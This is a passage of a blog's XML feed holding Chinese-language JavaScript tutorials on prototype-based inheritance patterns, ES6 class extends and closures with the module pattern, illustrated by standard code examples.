class="line">instance1.sayAge(); <span class="comment">//29</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubType(<span class="string">&quot;Greg&quot;</span>, <span class="number">27</span>);</span><br><span class="line">alert(instance2.colors); <span class="comment">//&quot;red,blue,green&quot;</span></span><br><span class="line">instance2.sayName(); <span class="comment">//&quot;Greg&quot;;</span></span><br><span class="line">instance2.sayAge(); <span class="comment">//27</span></span><br></pre></td></tr></table></figure><p>缺点：</p><ul><li>第一次调用<code>SuperType()</code>：给<code>SubType.prototype</code>写入两个属性<code>name</code>，<code>color</code>。</li><li>第二次调用<code>SuperType()</code>：给<code>instance1</code>写入两个属性<code>name</code>，<code>color</code>。</li></ul><p>实例对象<code>instance1</code>上的两个属性就屏蔽了其原型对象<code>SubType.prototype</code>的两个同名属性。所以，组合模式的缺点就是在<strong>使用子类创建实例对象时，其原型中会存在两份相同的属性/方法。</strong></p><h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><p>利用一个<strong>空对象</strong>作为中介，将<strong>某个对象直接赋值给空对象构造函数的原型</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">  F.prototype = obj;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>object()对传入其中的对象执行了一次<code>浅复制</code>，<strong>将构造函数F的原型直接指向传入的对象</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Nicholas&quot;</span>,</span><br><span class="line">  <span class="attr">friends</span>: [<span class="string">&quot;Shelby&quot;</span>, <span class="string">&quot;Court&quot;</span>, <span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> anotherPerson = object(person);</span><br><span class="line">anotherPerson.name = <span class="string">&quot;Greg&quot;</span>;</span><br><span class="line">anotherPerson.friends.push(<span class="string">&quot;Rob&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> yetAnotherPerson = object(person);</span><br><span class="line">yetAnotherPerson.name = <span class="string">&quot;Linda&quot;</span>;</span><br><span class="line">yetAnotherPerson.friends.push(<span class="string">&quot;Barbie&quot;</span>);</span><br><span class="line"></span><br><span class="line">alert(person.friends);   <span class="comment">//&quot;Shelby,Court,Van,Rob,Barbie&quot;</span></span><br></pre></td></tr></table></figure><p>缺点：</p><ul><li>原型链继承多个实例的引用类型属性指向相同，存在篡改的可能。</li><li>无法传递参数</li></ul><p>另外，ES5中存在<code>Object.create()</code>的方法，能够代替上面的object方法。</p><h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><p>核心：在原型式继承的基础上，增强对象，返回构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAnother</span>(<span class="params">original</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> clone = object(original); <span class="comment">// 通过调用 object() 函数创建一个新对象</span></span><br><span class="line">  clone.sayHi = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  <span class="comment">// 以某种方式来增强对象</span></span><br><span class="line">    alert(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> clone; <span class="comment">// 返回这个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的主要作用是为构造函数新增属性和方法，以<strong>增强函数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Nicholas&quot;</span>,</span><br><span class="line">  <span class="attr">friends</span>: [<span class="string">&quot;Shelby&quot;</span>, <span class="string">&quot;Court&quot;</span>, <span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> anotherPerson = createAnother(person);</span><br><span class="line">anotherPerson.sayHi(); <span class="comment">//&quot;hi&quot;</span></span><br></pre></td></tr></table></figure><p>缺点（同原型式继承）：</p><ul><li>原型链继承多个实例的引用类型属性指向相同，存在篡改的可能。</li><li>无法传递参数</li></ul><h2 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h2><p>结合借用构造函数传递参数和寄生模式实现继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">subType, superType</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> prototype = <span class="built_in">Object</span>.create(superType.prototype); <span class="comment">// 创建对象，创建父类原型的一个副本</span></span><br><span class="line">  prototype.constructor = subType;                    <span class="comment">// 增强对象，弥补因重写原型而失去的默认的constructor 属性</span></span><br><span class="line">  subType.prototype = prototype;                      <span class="comment">// 指定对象，将新创建的对象赋值给子类的原型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类初始化实例属性和原型属性</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">  <span class="built_in">this</span>.colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;blue&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 借用构造函数传递增强子类实例属性（支持传参和避免篡改）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name, age</span>)</span>&#123;</span><br><span class="line">  SuperType.call(<span class="built_in">this</span>, name);</span><br><span class="line">  <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将父类原型指向子类</span></span><br><span class="line">inheritPrototype(SubType, SuperType);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增子类原型属性</span></span><br><span class="line">SubType.prototype.sayAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance1 = <span class="keyword">new</span> SubType(<span class="string">&quot;xyc&quot;</span>, <span class="number">23</span>);</span><br><span class="line"><span class="keyword">var</span> instance2 = <span class="keyword">new</span> SubType(<span class="string">&quot;lxy&quot;</span>, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">instance1.colors.push(<span class="string">&quot;2&quot;</span>); <span class="comment">// [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;2&quot;]</span></span><br><span class="line">instance1.colors.push(<span class="string">&quot;3&quot;</span>); <span class="comment">// [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;3&quot;]</span></span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/10/30/166c2c0109df5438~tplv-t2oaga2asx-watermark.awebp" alt="img"></p><p>这个例子的高效率体现在它只调用了一次<code>SuperType</code> 构造函数，并且因此避免了在<code>SubType.prototype</code> 上创建不必要的、多余的属性。于此同时，原型链还能保持不变；因此，还能够正常使用<code>instanceof</code> 和<code>isPrototypeOf()</code></p><p><strong>这是最成熟的方法，也是现在库实现的方法</strong>。</p><h2 id="混入方式继承多个对象"><a href="#混入方式继承多个对象" class="headerlink" title="混入方式继承多个对象"></a>混入方式继承多个对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MyClass</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     SuperClass.call(<span class="built_in">this</span>);</span><br><span class="line">     OtherSuperClass.call(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承一个类</span></span><br><span class="line">MyClass.prototype = <span class="built_in">Object</span>.create(SuperClass.prototype);</span><br><span class="line"><span class="comment">// 混合其它</span></span><br><span class="line"><span class="built_in">Object</span>.assign(MyClass.prototype, OtherSuperClass.prototype);</span><br><span class="line"><span class="comment">// 重新指定constructor</span></span><br><span class="line">MyClass.prototype.constructor = MyClass;</span><br><span class="line"></span><br><span class="line">MyClass.prototype.myMethod = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="comment">// do something</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Object.assign</code>会把  <code>OtherSuperClass</code>原型上的函数拷贝到 <code>MyClass</code>原型上，使 MyClass 的所有实例都可用 OtherSuperClass 的方法。</p><h2 id="ES6类继承extends"><a href="#ES6类继承extends" class="headerlink" title="ES6类继承extends"></a>ES6类继承extends</h2><p><code>extends</code>关键字主要用于类声明或者类表达式中，以创建一个类，该类是另一个类的子类。其中<code>constructor</code>表示构造函数，一个类中只能有一个构造函数，有多个会报出<code>SyntaxError</code>错误,如果没有显式指定构造方法，则会添加默认的 <code>constructor</code>方法，使用例子如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line">    <span class="comment">// constructor</span></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">height, width</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Getter</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.calcArea()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Method</span></span><br><span class="line">    <span class="function"><span class="title">calcArea</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rectangle = <span class="keyword">new</span> Rectangle(<span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line"><span class="built_in">console</span>.log(rectangle.area);</span><br><span class="line"><span class="comment">// 输出 200</span></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Rectangle</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">length</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(length, length);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果子类中存在构造函数，则需要在使用“this”之前首先调用 super()。</span></span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&#x27;Square&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span> <span class="title">area</span>() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.height * <span class="built_in">this</span>.width;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> square = <span class="keyword">new</span> Square(<span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(square.area);</span><br><span class="line"><span class="comment">// 输出 100</span></span><br></pre></td></tr></table></figure><p><code>extends</code>继承的核心代码如下，其实现和上述的寄生组合式继承方式一样</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_inherits</span>(<span class="params">subType, superType</span>) </span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建对象，创建父类原型的一个副本</span></span><br><span class="line">    <span class="comment">// 增强对象，弥补因重写原型而失去的默认的constructor 属性</span></span><br><span class="line">    <span class="comment">// 指定对象，将新创建的对象赋值给子类的原型</span></span><br><span class="line">    subType.prototype = <span class="built_in">Object</span>.create(superType &amp;&amp; superType.prototype, &#123;</span><br><span class="line">        <span class="attr">constructor</span>: &#123;</span><br><span class="line">            <span class="attr">value</span>: subType,</span><br><span class="line">            <span class="attr">enumerable</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">configurable</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (superType) &#123;</span><br><span class="line">        <span class="built_in">Object</span>.setPrototypeOf </span><br><span class="line">            ? <span class="built_in">Object</span>.setPrototypeOf(subType, superType) </span><br><span class="line">            : subType.__proto__ = superType;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>1、函数声明和类声明的区别</strong></p><p>函数声明会提升，类声明不会。<strong>首先需要声明你的类</strong>，然后访问它，否则会抛出一个<code>ReferenceError</code>。</p><p><strong>2、ES5继承和ES6继承的区别</strong></p><ul><li>ES5的继承实质上是<strong>先创建子类的实例对象，然后再将父类的方法添加到this上（Parent.call(this)）</strong>。</li><li>ES6的继承有所不同，实质上是<strong>先创建父类的实例对象this，然后再用子类的构造函数修改this。因为子类没有自己的this对象，所以必须先调用父类的super()方法，否则新建实例报错。</strong></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原型和继承&quot;&gt;&lt;a href=&quot;#原型和继承&quot; class=&quot;headerlink&quot; title=&quot;原型和继承&quot;&gt;&lt;/a&gt;原型和继承&lt;/h1&gt;&lt;h2 id=&quot;原型&quot;&gt;&lt;a href=&quot;#原型&quot; class=&quot;headerlink&quot; title=&quot;原型&quot;&gt;&lt;/a&gt;原</summary>
      
    
    
    
    <category term="JS" scheme="https://lesliewaong.top/categories/JS/"/>
    
    
    <category term="原型" scheme="https://lesliewaong.top/tags/%E5%8E%9F%E5%9E%8B/"/>
    
    <category term="继承" scheme="https://lesliewaong.top/tags/%E7%BB%A7%E6%89%BF/"/>
    
    <category term="new" scheme="https://lesliewaong.top/tags/new/"/>
    
    <category term="bind" scheme="https://lesliewaong.top/tags/bind/"/>
    
    <category term="instanceof" scheme="https://lesliewaong.top/tags/instanceof/"/>
    
  </entry>
  
  <entry>
    <title>闭包及其应用</title>
    <link href="https://lesliewaong.top/posts/9004b718.html"/>
    <id>https://lesliewaong.top/posts/9004b718.html</id>
    <published>2022-02-20T11:12:02.000Z</published>
    <updated>2022-03-25T14:08:26.408Z</updated>
    
    <content type="html"><![CDATA[<h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><p><strong>一个函数</strong>和对其周围状态（<strong>lexical environment，词法环境</strong>）的<strong>引用</strong>捆绑在一起（或者说函数被引用包围），这样的组合就是<strong>闭包</strong>（<strong>closure</strong>）。</p><p>也就是说，闭包让你可以在一个<strong>内层函数</strong>中<strong>访问到其外层函数的作用域</strong>。</p><p>在 JavaScript 中，<strong>每当创建一个函数，闭包就会在函数创建的同时被创建出来。</strong></p><h2 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h2><p>请看下面的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">&quot;Mozilla&quot;</span>; <span class="comment">// name 是一个被 init 创建的局部变量</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">displayName</span>(<span class="params"></span>) </span>&#123; <span class="comment">// displayName() 是内部函数，一个闭包</span></span><br><span class="line">      alert(name); <span class="comment">// 使用了父函数中声明的变量</span></span><br><span class="line">  &#125;</span><br><span class="line">  displayName();</span><br><span class="line">&#125;</span><br><span class="line">init();</span><br></pre></td></tr></table></figure><p><code>init()</code> 创建了一个局部变量 <code>name</code> 和一个名为 <code>displayName()</code> 的函数。<code>displayName()</code> 是定义在 <code>init()</code> 里的内部函数，并且仅在 <code>init()</code> 函数体内可用。请注意，<code>displayName()</code> 没有自己的局部变量。然而，因为它可以访问到外部函数的变量，所以 <code>displayName()</code> 可以使用父函数 <code>init()</code> 中声明的变量 <code>name</code> 。</p><p>运行该代码后发现， <code>displayName()</code> 函数内的 <code>alert()</code> 语句成功显示出了变量 <code>name</code> 的值（该变量在其父函数中声明）。这个词法作用域的例子描述了分析器如何在函数嵌套的情况下解析变量名。词法（lexical）一词指的是，词法作用域根据源代码中声明变量的位置来确定该变量在何处可用。嵌套函数可访问声明于它们外部作用域的变量。</p><h2 id="闭包-1"><a href="#闭包-1" class="headerlink" title="闭包"></a>闭包</h2><p>现在来考虑以下例子 ：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeFunc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="string">&quot;Mozilla&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">displayName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> displayName;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myFunc = makeFunc();</span><br><span class="line">myFunc();</span><br></pre></td></tr></table></figure><p>运行这段代码的效果和之前 <code>init()</code> 函数的示例完全一样。其中不同的地方（也是有意思的地方）在于内部函数 <code>displayName()</code> 在执行前，从外部函数返回。</p><p>第一眼看上去，也许不能直观地看出这段代码能够正常运行。在一些编程语言中，一个函数中的局部变量仅存在于此函数的执行期间。一旦 <code>makeFunc()</code> 执行完毕，你可能会认为 <code>name</code> 变量将不能再被访问。然而，因为代码仍按预期运行，所以在 JavaScript 中情况显然与此不同。</p><p>原因在于，JavaScript中的函数会形成了闭包。 </p><p><strong>闭包是由函数以及声明该函数的词法环境组合而成的。该环境包含了这个闭包创建时作用域内的任何局部变量。</strong></p><p>在本例子中，<code>myFunc</code> 是执行 <code>makeFunc</code> 时创建的 <code>displayName</code> 函数实例的引用。<code>displayName</code> 的实例维持了一个对它的词法环境（变量 <code>name</code> 存在于其中）的引用。因此，当 <code>myFunc</code> 被调用时，变量 <code>name</code> 仍然可用，其值 <code>Mozilla</code> 就被传递到<code>alert</code>中。</p><h3 id="闭包原理"><a href="#闭包原理" class="headerlink" title="闭包原理"></a>闭包原理</h3><blockquote><p>本质就是上级作用域内变量的生命周期，因为被下级作用域内引用，而没有被释放。就导致上级作用域内的变量，等到下级作用域执行完以后才正常得到释放。</p></blockquote><p>利用了函数<strong>作用域链</strong>的特性，<strong>一个函数内部定义的函数会将包含外部函数的活动对象添加到它的作用域链中，函数执行完毕，其执行作用域链销毁，但因内部函数的作用域链仍然在引用这个活动对象，所以其活动对象不会被销毁，直到内部函数被烧毁后才被销毁。</strong></p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>可以<strong>从内部函数访问外部函数的作用域中的变量，且访问到的变量长期驻扎在内存中，可供之后使用</strong>。</li><li>避免变量污染全局。</li><li>把变量存到独立的作用域，作为私有成员存在。</li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>对内存消耗有负面影响。因内部函数保存了对外部变量的引用，导致无法被垃圾回收，增大内存使用量，所以<strong>使用不当会导致内存泄漏</strong>。</li><li>对处理速度具有负面影响。<strong>闭包的层级决定了引用的外部变量在查找时经过的作用域链长度</strong>。</li><li>可能获取到意外的值(captured value)。</li></ul><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><h3 id="用闭包模拟私有方法"><a href="#用闭包模拟私有方法" class="headerlink" title="用闭包模拟私有方法"></a>用闭包模拟私有方法</h3><p>编程语言中，比如 Java，是支持将方法声明为私有的，即它们只能被同一个类中的其它方法所调用。</p><p>而 JavaScript 没有这种原生支持，但我们可以<strong>使用闭包来模拟私有方法</strong>。</p><p>私有方法不仅仅有利于<strong>限制对代码的访问</strong>：还提供了<strong>管理全局命名空间的强大能力</strong>，<strong>避免非核心的方法弄乱了代码的公共接口部分。</strong></p><p>下面的示例展现了如何使用闭包来定义公共函数，并令其可以访问私有函数和变量。这个方式也称为<strong>模块模式（module pattern）</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Counter = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeBy</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounter += val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">increment</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decrement</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(-<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">value</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Counter.value()); <span class="comment">/* logs 0 */</span></span><br><span class="line">Counter.increment();</span><br><span class="line">Counter.increment();</span><br><span class="line"><span class="built_in">console</span>.log(Counter.value()); <span class="comment">/* logs 2 */</span></span><br><span class="line">Counter.decrement();</span><br><span class="line"><span class="built_in">console</span>.log(Counter.value()); <span class="comment">/* logs 1 */</span></span><br></pre></td></tr></table></figure><p>在之前的示例中，每个闭包都有它自己的词法环境；而这次我们只创建了一个词法环境，为三个函数所共享：<code>Counter.increment</code>，<code>Counter.decrement</code> 和<code>Counter.value</code>。</p><p>该共享环境创建于一个立即执行的匿名函数体内。这个环境中包含两个私有项：名为 <code>privateCounter</code> 的变量和名为 <code>changeBy</code> 的函数。<strong>这两项都无法在这个匿名函数外部直接访问。必须通过匿名函数返回的三个公共函数访问。</strong></p><p><strong>这三个公共函数是共享同一个环境的闭包。</strong></p><p>多亏 JavaScript 的词法作用域，它们都可以访问 <code>privateCounter</code> 变量和 <code>changeBy</code> 函数。</p><p><strong>备注：</strong>你应该注意到我们定义了一个匿名函数，用于创建一个计数器。我们立即执行了这个匿名函数，并将他的值赋给了变量<code>Counter</code>。我们可以把这个函数储存在另外一个变量<code>makeCounter</code>中，并用他来创建多个计数器。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> makeCounter = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> privateCounter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">changeBy</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    privateCounter += val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">increment</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(<span class="number">1</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">decrement</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      changeBy(-<span class="number">1</span>);</span><br><span class="line">    